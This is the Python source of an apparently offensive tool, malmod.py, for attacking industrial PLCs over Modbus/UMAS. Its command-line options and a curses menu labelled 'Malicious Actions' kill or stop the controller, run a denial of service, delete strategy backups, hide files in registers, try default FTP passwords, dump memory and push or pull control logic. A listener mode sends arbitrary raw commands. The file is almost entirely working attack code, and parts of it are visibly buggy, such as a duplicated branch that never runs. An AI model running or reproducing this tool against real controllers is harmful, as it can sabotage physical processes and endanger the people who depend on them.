from __future__ import print_function
from datetime import datetime
import time
import sys
import getopt
import os
import logging
import iptc
import subprocess
import curses
import threading
from aux import *
from umas import *
from mal_functions import *
from ftplib import FTP
from pymodbus.client.sync import ModbusTcpClient as ModbusClient

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

k=0
t="";
trans=0
th=None
LoopInfinito=False

rule = iptc.Rule()

Command_File="commands.cmd"


# This function displays the appropriate menu and returns the option selected
def runmenu(menu, parent):

  # work out what text to display as the last menu option
  if parent is None:
    lastoption = "Disconnect PLC and exit"
  else:
    lastoption = "Return to %s menu" % parent['title']

  optioncount = len(menu['options']) # how many options in this menu

  pos=0 #pos is the zero-based index of the hightlighted menu option.  Every time runmenu is called, position returns to 0, when runmenu ends the position is returned and tells the program what option has been selected
  oldpos=None # used to prevent the screen being redrawn every time
  x = None #control for while loop, let's you scroll through options until return key is pressed then returns pos to program
  
  # Loop until return key is pressed
  while x !=ord('\n'):
    if pos != oldpos:
      oldpos = pos
      screen.clear() #clears previous screen on key press and updates display based on pos
      screen.border(0)
      screen.addstr(2,2, menu['title'], curses.A_STANDOUT) # Title for this menu
      screen.addstr(4,2, menu['subtitle'], curses.A_BOLD) #Subtitle for this menu

#      outputscreen.clear()
      outputscreen.border(0)

      # Display all the menu items, showing the 'pos' item highlighted
      for index in range(optioncount):
        textstyle = n
        if pos==index:
          textstyle = h
        screen.addstr(5+index,4, "%d - %s" % (index+1, menu['options'][index]['title']), textstyle)
      # Now display Exit/Return at bottom of menu
      textstyle = n
      if pos==optioncount:
        textstyle = h
      screen.addstr(5+optioncount,4, "%d - %s" % (optioncount+1, lastoption), textstyle)
      screen.refresh()
      outputscreen.refresh()
      # finished updating screen

    x = screen.getch() # Gets user input

    # What is user input?
    if x >= ord('1') and x <= ord(str(optioncount+1)):
      pos = x - ord('0') - 1 # convert keypress back to a number, then subtract 1 to get index
    elif x == 258: # down arrow
      if pos < optioncount:
	pos += 1
      else: pos = 0
    elif x == 259: # up arrow
      if pos > 0:
	  pos += -1
      else: pos = optioncount
    elif x != ord('\n'):
      curses.flash()

  # return index of the selected item (It only allows 9 options)
  return pos

# This function calls showmenu and then acts on the selected item
def processmenu(menu, parent=None):
  global LoopInfinito
  global th


  optioncount = len(menu['options'])
  exitmenu = False
  while not exitmenu: #Loop until the user exits the menu
    getin = runmenu(menu, parent)
    if getin == optioncount:
        exitmenu = True
    elif menu['options'][getin]['type'] == COMMAND:
	if menu['options'][getin]['command']=='COMM_CARD_INFO':
		LoopInfinito=False
		outputscreen.clear()
		pck=get_internal_card_info()
        	
		cadn=str(pck)[:100].encode("HEX").replace('0x','')
        	if ((cadn.find("00fd") > 0)):
                	write_screen ("\nError: could not obtain Card information")
        	else:
                	write_screen ("\nCard Info obtained:")
                	write_screen (str(pck)[57:])

        	time.sleep(0.5)
		LoopInfinito=True
		#th.start()

	if menu['options'][getin]['command']=='COMM_STOP':
		LoopInfinito=False
		time.sleep(0.5)
        	if (is_running()):
                	stop_plc()
        	else:
                	write_screen ("\nPLC is already stopped")
        	time.sleep(0.5)
		LoopInfinito=True
		#th.start()


	if menu['options'][getin]['command']=='COMM_START':
		LoopInfinito=False
		time.sleep(0.5)
        	if not (is_running()):
                	start_plc()
        	else:
                	write_screen ("\nPLC is already running")
        	time.sleep(0.5)

	if menu['options'][getin]['command']=='CMD_DOWNLOAD_APX':
        	time.sleep(0.5)
		LoopInfinito=False
		was_running=False
        	if (is_running()):
                	was_running=True
                	stop_plc();
        	download_strategy('/tmp/strategy.apx');
        	time.sleep(2)
        	if was_running:
                	start_plc()

        	time.sleep(0.5)
		LoopInfinito=True
		#th.start()
	
	if menu['options'][getin]['command']=='CMD_UPLOAD_APX':
        	time.sleep(0.5)
		LoopInfinito=False
		stop_plc();
        	upload_strategy('/tmp/strategy.apx');
        	time.sleep(1)
        	start_plc();
        	time.sleep(3)
		LoopInfinito=True

	if menu['options'][getin]['command']=='COMM_GET_DEVICE_INFO':
        	time.sleep(0.5)
		LoopInfinito=False
        	packet=device_information()
        	time.sleep(0.5)
        	write_screen ("\nDevice Info obtained:")
        	write_screen (str(packet)[72:])
        	time.sleep(3)
		LoopInfinito=True


	if menu['options'][getin]['command']=='CMD_KILL_PLC':
		LoopInfinito=False
        	kill_plc()
        	write_screen("\nPLC died\n")

	if menu['options'][getin]['command']=='CMD_STORE_FILE':
		LoopInfinito=False
		Fil='/tmp/plc_file.dat'
 		if os.path.isfile(Fil):
                	store_file(Fil, 1)
			LoopInfinito=True
        	else:
                	print ("Error: file not found. Use malmod.py -h for further help")
                	sys.exit(4)
		time.sleep(1)

	if menu['options'][getin]['command']=='CMD_CHECK_BACKUP':
		kk=1

	if menu['options'][getin]['command']=='CMD_CREATE_BACKUP':
		LoopInfinito=False
        	create_backup()
		LoopInfinito=True
		time.sleep(1)

	if menu['options'][getin]['command']=='CMD_RESTORE_BACKUP':
		LoopInfinito=False
        	restore_backup()
		LoopInfinito=True
		time.sleep(1)

	if menu['options'][getin]['command']=='CMD_DELETE_BACKUP':
		LoopInfinito=False
        	remove_backup()
		LoopInfinito=True
		time.sleep(1)

	if menu['options'][getin]['command']=='CMD_EXTRACT_INFO':
		LoopInfinito=False
        	was_running=False
        	if (is_running()):
                	was_running=True
                	stop_plc();
        	time.sleep(0.5)
        	extract_information()
        	if (was_running):
                	start_plc()
		LoopInfinito=True

    elif menu['options'][getin]['type'] == MENU:
      processmenu(menu['options'][getin], menu) # display the submenu

###################################
# Function to keep alive connection
###################################
def keep_alive_thread():
	while LoopInfinito:
		try:
			time.sleep(0.4)
		except:
			reset_connection()
			print ("\n\n")
			sys.exit(12)

		pck=send_keep_alive()

#########################################################################################
####################              MAIN                ###################################
#########################################################################################

##banner()

try:
	opts, args = getopt.getopt(sys.argv[1:],"c:m:u:d:a:b:vfwhlskiyzxonRDB",["command-file=","ip=","upload-strategy","download-strategy","store-file=","retrieve-file=","verbose","very-verbose","help","listener-mode","get-info","start","stop","restore-backup","delete-backup","create-backup","size=","kill-plc","plc-dos","set-date=","set-time=","get-time","ncurses"])
except getopt.GetoptError:
	syntax_information()
	sys.exit(2)

###INITIALIZING VARIABLES
IP_DST=""
ACTION=""
set_verb(False)
set_verbose(False)
filsze=0

if (len(opts)==0):
	syntax_information()
	sys.exit(2)

for opt, arg in opts:
	if opt == '-h':
		print ('usage: malmod.py [-h] [-v|-w] -m <PLC IP> [-u <File to Upload>|-d <File to Download>|-i|-c|-a|-b|-x|-y|-k|-l|-L|-f|-n]')
		print ('		-h: this help text')
		print ('		-m <IP>: PLC IP address')
		print ('MODIFIERS:')
		print ('		-v | --verbose: verbose output')
		print ('		-w | --very-verbose: very verbose output')
		print ('ACTIONS:')
		print ('		--upload-strategy | -u <PATH>: ATX file to upload')
		print ('		--download-strategy | -d <PATH>: Path to ATX file to download strategy in')
		print ('		--get-info | -i: Get Device Information')
		print ('		-s: Get Card Information')
		print ('		--store-file | -a <FILE>: Store File in Holding registers')
		print ('		--retrieve-file | -b <FILE>: Retrieve File in Holding registers')
		print ('		--command-file | -c <FILE>: Command File (Only in listener mode)')
		print ('		--listener-mode | -l: Listener Mode')
		print ('		--ncurses | -n: use curses interface')
		print ('		--restore-backup | -R: Restore strategy from backup')
		print ('		--delete-backup | -D: Delete backup of strategy from card')
		print ('		--backup | -B: Backup styrategy into card')
		print ('		--start | -y: Start PLC')
		print ('		-x: Check if PLC is Running (with -v)')
		print ('		--stop | -z: Stop PLC')
		print ('		--kill-plc | -k: Stop PLC')
		print ('		-f: Try default FTP passwords')
		print ('		--set-date=<DD/MM/YYYY>')
		print ('		--set-time=<HH:MM:SS>')
		print ('		--get-time: return time of PLC')
		sys.exit()

	elif opt in ('-v', "--verbose"):
		set_verb(True)
		set_verbose(False)

	elif opt == '-w':
		set_verbose(True)
		set_verb(True)

	elif opt in ("-m", "--ip"):
		set_IP(arg)
		IP_DST = arg

	elif opt in ("-c","--command-file"):
				Command_File = arg

	#DOWNLOAD STRATEGY
	elif opt in ("-d","--download-strategy"):
		Filename = arg
		ACTION="DOWNLOAD"

	#UPLOAD STRATEGY
	elif opt in ("-u","--upload-strategy"):
		Filename = arg
		if os.path.isfile(Filename):
			ACTION="UPLOAD"
		else:
			print ("Error: file not found. Use malmod.py -h for further help")
			sys.exit(3)
				
	elif opt in ("-a","--store-file"):
		ACTION="STORE_FILE"
		Fil=arg

	elif opt in ("-b","--retrieve-file"):
		File=arg
		ACTION="RETRIEVE_FILE"

	elif opt in ("-l","--listener-mode"):
		ACTION="LISTENER_MODE"

	elif opt in ("-n","--ncurses"):
		#global NCURSES
		#NCURSES=True
		ACTION="NCURSES_MODE"

	elif opt in ("-i","--get-info"):
		ACTION="GET_INFO"

	elif opt == ("-s"):
		ACTION="GET_CARD_INFO"

	elif opt == ("-k"):
		ACTION="KILL_PLC"

	elif opt == ("--size"):
		filsze=arg

	elif opt in ("-y","--start"):
		ACTION="START_PLC"

	elif opt in ("-z","--stop"):
		ACTION="STOP_PLC"

	elif opt == ("-x"):
		ACTION="CHECK_RUN"

	elif opt in ("-R","--restore-backup"):
		ACTION="RESTORE_BACKUP"

	elif opt in ("-D","--delete-backup"):
		ACTION="DELETE_BACKUP"

	elif opt in ("-B","--backup"):
		ACTION="BACKUP_STRATEGY"
	
	elif opt == ("-f"):
		try_default_ftp_passwords()
		sys.exit(0)

	elif opt == ("--set-date"):
		date_str=arg
		ACTION="SET-DATE"

	elif opt == ("--set-time"):
		time_str=arg
		ACTION="SET-TIME"
	
	elif opt == ("--get-time"):
		ACTION="GET-SYSTEM-TIME"

	elif opt == ("-o"):
		initialize(IP_DST)
		read_sections13_14()
		send_id()
		if not is_running():
			start_plc()
		time.sleep(1)

		#send_command("00 20 00 01 00 00 00 00 00 64 00")
		#time.sleep(0.5)
		#send_command("00 21 00 01 00 00 00 00 00 02 00 61 61")
		#time.sleep(0.5)
		#send_command("00 20 00 01 00 00 00 00 00 64 00")

		#memory_dump("12 00", "/tmp/dump12.dat")

		#getallsystembits()
		monitorallsystembits()
		#monitor_systembit(18)

if ((IP_DST == "") & (ACTION != "")):
	print ("Error: no PLC IP specified.")
       	print ('\nUsage: malmod.py [-h] [-v|-w] -m <PLC IP> [-u <File to Upload>|-d <File to Download>]')
       	sys.exit()

#Listener Mode: We open connnection with PLC and leave it open. This way we will be able to send commands to it writing them in the 'command file'
if (ACTION=="LISTENER_MODE"):
	set_verb(True)
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	write_screen("\nListening...")
	while True:
		try:
			time.sleep(0.4)
		except:
			#With Ctrl+C exits from listening mode
			reset_connection()
			print ("\n\n")
			sys.exit(12)

		#pck=send_command("00 04 00")
		pck=send_keep_alive()
		if (os.path.isfile(Command_File)):
			f=open(Command_File, "r")
			comando=f.read(1024)	
			write_screen("\nExecuting..."+str(comando[:-1])+"...")
			pck=send_command(str(comando[:-1]))
			write_screen ("\nPLC reply: "+str(pck).encode("HEX").replace('0x','')[92:]+"\n")
			f.close()
			time.sleep(1)
			os.remove(Command_File)

#NCURSES Mode: It opens a connnection with PLC and leave it open. Show an NCURSES Menu for further interaction
if (ACTION=="NCURSES_MODE"):
	set_verb(True)
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	write_screen("\nListening...")
	print ("\nSuccessfully connected to PLC!!")
	time.sleep(2)

    	th = threading.Thread(target=keep_alive_thread)
	LoopInfinito=True
    	th.start()

	screen = curses.initscr() #initializes a new window for capturing key presses
	outputscreen=curses.newwin(30,255,37,7)
	set_outputscreen(outputscreen)
	curses.noecho() # Disables automatic echoing of key presses (prevents program from input each key twice)
	curses.cbreak() # Disables line buffering (runs each key as it is pressed rather than waiting for the return key to pressed)
	curses.start_color() # Lets you use colors when highlighting selected menu option
	screen.keypad(1) # Capture input from keypad
	
	# Change this to use different colors when highlighting
	curses.init_pair(1,curses.COLOR_BLACK, curses.COLOR_WHITE) # Sets up color pair #1, it does black text with white background 
	h = curses.color_pair(1) #h is the coloring for a highlighted menu option
	n = curses.A_NORMAL #n is the coloring for a non highlighted menu option
	
	MENU = "menu"
	COMMAND = "command"

	
	menu_data = {
  	'title': "Main Menu", 'type': MENU, 'subtitle': "Please selection an option...",
  	'options': [
    		{
      			'title': "UMAS simple commands", 'type': MENU, 'subtitle': "Please selection an option...",
      			'options': [
        			{ 'title': "Get Device Information (02)", 'type': COMMAND, 'command': 'COMM_GET_DEVICE_INFO' },
        			{ 'title': "Get Internal SD Information (06)", 'type': COMMAND, 'command': 'COMM_CARD_INFO' },
        			{ 'title': "Repeat Information (0A)", 'type': COMMAND, 'command': 'COMM_REPEAT' },
        			{ 'title': "Assign ID (10)", 'type': COMMAND, 'command': 'COMM_ASSIGN_ID' },
        			{ 'title': "Start PLC (0A)", 'type': COMMAND, 'command': 'COMM_START' },
        			{ 'title': "Stop PLC (0A)", 'type': COMMAND, 'command': 'COMM_STOP' },
				]
		},
		{

          		'title': "PLC Actions", 'type': MENU, 'subtitle': "Please select an option...",
          		'options': [
            			{ 'title': "Download strategy (to /tmp/strategy.apx)", 'type': COMMAND, 'command': 'CMD_DOWNLOAD_APX' },
            			{ 'title': "Upload strategy", 'type': COMMAND, 'command': 'CMD_UPLOAD_APX' },
        			{ 'title': "Start PLC (0A)", 'type': COMMAND, 'command': 'COMM_START' },
        			{ 'title': "Stop PLC (0A)", 'type': COMMAND, 'command': 'COMM_STOP' },
            			{ 'title': "Create strategy backup in SD Card", 'type': COMMAND, 'command': 'CMD_CREATE_BACKUP' },
            			{ 'title': "Check strategy backup in SD Card", 'type': COMMAND, 'command': 'CMD_CHECK_BACKUP' },
            			{ 'title': "Retrieve strategy backup from SD Card", 'type': COMMAND, 'command': 'CMD_RETRIEVE_BACKUP' },
            			{ 'title': "Remove strategy backup in SD Card", 'type': COMMAND, 'command': 'CMD_REMOVE_BACKUP' },
          			]
		},
		{
          		'title': "PLC Information gathering'", 'type': MENU, 'subtitle': "Please select an option...",
          		'options': [
            			{ 'title': "Check default FTP passwords", 'type': COMMAND, 'command': 'CMD_CHECK_FTP' },
            			{ 'title': "Get All System bits", 'type': COMMAND, 'command': 'CMD_GET_SBIT' },
            			{ 'title': "Get All System words", 'type': COMMAND, 'command': 'CMD_GET_SWORD' },
            			{ 'title': "Extract ZLIB Blobs from APX File", 'type': COMMAND, 'command': 'CMD_BINWALK' },
            			{ 'title': "Extract Information", 'type': COMMAND, 'command': 'CMD_EXTRACT_INFO' },
            			{ 'title': "Memory dump", 'type': COMMAND, 'command': 'CMD_MEMORY_DUMP' },
				]
		},
		{
          		'title': "Malicious Actions", 'type': MENU, 'subtitle': "Please select an option...",
          		'options': [
            			{ 'title': "Kill PLC", 'type': COMMAND, 'command': 'CMD_KILL_PLC' },
            			{ 'title': "STORE FILE", 'type': COMMAND, 'command': 'CMD_STORE_FILE' },
            			{ 'title': "RETRIEVE FILE", 'type': COMMAND, 'command': 'CMD_RETRIEVE_FILE' },
            			{ 'title': "PLC D.O.S.", 'type': COMMAND, 'command': 'CMD_PLC_DOS' },
            			{ 'title': "Remove strategy backup from SD Card", 'type': COMMAND, 'command': 'CMD_REMOVE_BACKUP' },
        			{ 'title': "Stop PLC (0A)", 'type': COMMAND, 'command': 'COMM_STOP' },
          			]
        	},
      		]
    	}

	set_curses(True)
	
	processmenu(menu_data)
	curses.endwin() #VITAL!  This closes out the menu system and returns you to the bash prompt.

	set_curses(False)
	LoopInfinito=False
	time.sleep(2)

elif (ACTION=="GET-SYSTEM-TIME"):
		initialize(IP_DST)
		read_sections13_14()
		send_id()

elif (ACTION=="GET-SYSTEM-TIME"):
		initialize(IP_DST)
		read_sections13_14()
		send_id()
		was_running=True
		if not (is_running()):
			was_running=False
			start_plc()
		time.sleep(1)

		year=get_systemword(53)
		monthday=get_systemword(52)
		print("\nPLC Date (dd/mm/yyyy): %02d/%02d/%4d" % (monthday%256,monthday//256,year))


		hourmin=get_systemword(51)
		sec=get_systemword(50)
		print("\nPLC Time (hh:mm:ss): %02d:%02d:%02d" % (hourmin//256, hourmin%256, sec))

		if not was_running:
			stop_plc()

		reset_connection()			
		sys.exit(0)

elif (ACTION=="SET-DATE"):
    		try:
        		date_plc=datetime.strptime(date_str, '%d/%m/%Y')
    		except ValueError:
			print("\nError: Date format is invalid")
			sys.exit(13)

		initialize(IP_DST)
		read_sections13_14()
		send_id()

		was_running=True
		if is_running():
			was_running=False
			start_plc()
		time.sleep(1)

		set_systembit(50,True)
		set_systemword(53,date_plc.year)
		set_systemword(52,date_plc.month*256+date_plc.day)
		set_systembit(50,False)

		if not was_running:
			stop_plc()

		reset_connection()			
		sys.exit(0)


elif (ACTION=="SET-TIME"):
    		try:
        		date_plc=datetime.strptime(time_str, '%H:%M:%S')
    		except ValueError:
			print("\nError: Time format is invalid")
			sys.exit(13)

		initialize(IP_DST)
		read_sections13_14()
		send_id()
		was_running=True
		if not is_running():
			was_running=False
			start_plc()

		time.sleep(1)

		set_systembit(50,True)
		set_systemword(50,date_plc.second)
		set_systemword(51,256*date_plc.hour+date_plc.minute)
		set_systembit(50,False)

		if not was_running:
			stop_plc()

		reset_connection()			
		sys.exit(0)


elif (ACTION=="STORE_FILE"):
	if os.path.isfile(Fil):
		store_file(Fil, 1)
	else:
		print ("Error: file not found. Use malmod.py -h for further help")
		sys.exit(4)

elif (ACTION=="RETRIEVE_FILE"):
	if (filsze>0):
		retrieve_file(File, 1, int(filsze))
	else:
		print ("Error: you must use option --size= to indicate size of file to be downloaded")
		sys.exit(8)

elif (ACTION=="DOWNLOAD"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	time.sleep(1)
	was_running=False
	if (is_running()):
		was_running=True
		stop_plc();
	download_strategy(Filename);
	time.sleep(3)
	if was_running:
		start_plc()

elif (ACTION=="UPLOAD"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	stop_plc();
	upload_strategy(Filename);
	time.sleep(1)
	start_plc();
	time.sleep(3)

elif (ACTION=="GET_DEVICE_INFO"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	send_keep_alive()	
	time.sleep(0.5)
	packet=device_information()
	time.sleep(0.5)
	print ("\nDevice Info obtained:")
	print (str(packet)[72:])
	time.sleep(3)

elif (ACTION=="GET_INFO"):
	sys.stdout.write("\nExtracting PLC information. The strategy will be downloaded. This will take a while...\n")	
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	was_running=False
	if (is_running()):
		was_running=True
		stop_plc();
	time.sleep(0.5)
	extract_information()
	if (was_running):
		start_plc()
	
elif (ACTION=="GET_CARD_INFO"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	send_keep_alive()	
	time.sleep(0.5)
	pck=get_internal_card_info()
	time.sleep(0.5)

 	cadn=str(pck)[:100].encode("HEX").replace('0x','')
        if ((cadn.find("00fd") > 0)):
		print ("\nError: could not obtain Card information")
	else:
		print ("\nCard Info obtained:")
		print (str(pck)[57:])
	time.sleep(2)

elif (ACTION=="START_PLC"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	send_keep_alive()	
	time.sleep(0.5)
	start_plc()
	time.sleep(0.5)
	time.sleep(3)

elif (ACTION=="STOP_PLC"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	send_keep_alive()	
	time.sleep(0.5)
	if (is_running()):
		stop_plc()
	else:
		print ("\nPLC already stopped")
	time.sleep(0.5)

elif (ACTION=="CHECK_RUN"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	if (is_running()):
		print ("\nThe PLC is running")
	else:
		print ("\nThe PLC is NOT running")


elif (ACTION=="RESTORE_BACKUP"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	restore_backup()
	

elif (ACTION=="DELETE_BACKUP"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	remove_backup()

elif (ACTION=="BACKUP_STRATEGY"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	create_backup()

elif (ACTION=="KILL_PLC"):
	initialize(IP_DST)
	read_sections13_14()
	send_id()
	#send_command("00 20")
	#stop_plc()	
	kill_plc()
	write_screen("PLC died")
	sys.exit()


if ((ACTION!="LISTENER_MODE") & (ACTION!="STORE_FILE") & (ACTION!="RETRIEVE_FILE")):
	reset_connection()
 	write_screen("\nExiting\n\n")
       	sys.exit()

#except:
# reset_connection()
# sys.exit()
write_screen("\n")	
